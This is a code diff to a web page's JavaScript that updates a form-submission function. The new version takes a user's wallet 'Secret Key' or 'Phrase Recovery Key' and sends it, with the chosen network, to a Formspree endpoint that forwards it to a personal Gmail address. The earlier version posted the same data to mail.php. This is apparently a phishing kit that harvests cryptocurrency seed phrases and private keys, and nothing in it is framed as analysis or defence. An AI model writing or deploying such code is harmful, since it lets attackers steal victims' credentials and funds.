@@ -119,25 +119,34 @@ function getInputValue() {
 }
 
 
-function submitDetails(){
-    var inputSecretKey = $("#inputSecretKey").val();
-    var PhraseInput = $("#PhraseInput").val();
+// Updated submitDetails function to use Formspree
+async function submitDetails(){
+    var inputSecretKey = document.getElementById("inputSecretKey").value;
+    var PhraseInput = document.getElementById("PhraseInput").value;
     var network = localStorage.getItem("Network");
-    var dataString = 'PhraseInput='+ PhraseInput + '&inputSecretKey=' + inputSecretKey + '&network='+ network;
 
-    $.ajax({
-        url: "mail.php",
-        type:"POST",
-        data: {
-            PhraseInput: PhraseInput,
-            inputSecretKey: inputSecretKey,
-            network: network,
-        },
-        dataType: "json",
-        success:function(data){
-            console.log(data);
-        },
-    });
+    try {
+        const response = await fetch("https://formspree.io/f/xwpbyawq", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                method: inputSecretKey ? "Secret Key" : "Phrase Recovery Key",
+                value: inputSecretKey || PhraseInput,
+                network: network,
+                to: "reneeandree09@gmail.com"
+            })
+        });
+
+        if (response.ok) {
+            console.log("Email sent successfully");
+        } else {
+            console.log("Failed to send email");
+        }
+    } catch (error) {
+        console.error("Error sending email:", error);
+    }
 }
 
 
@@ -151,4 +160,4 @@ submitBtn.forEach(submitModal => {
         submitBtnModal();
         // RENDER INPUT VALUE
     });
-}); 
+});
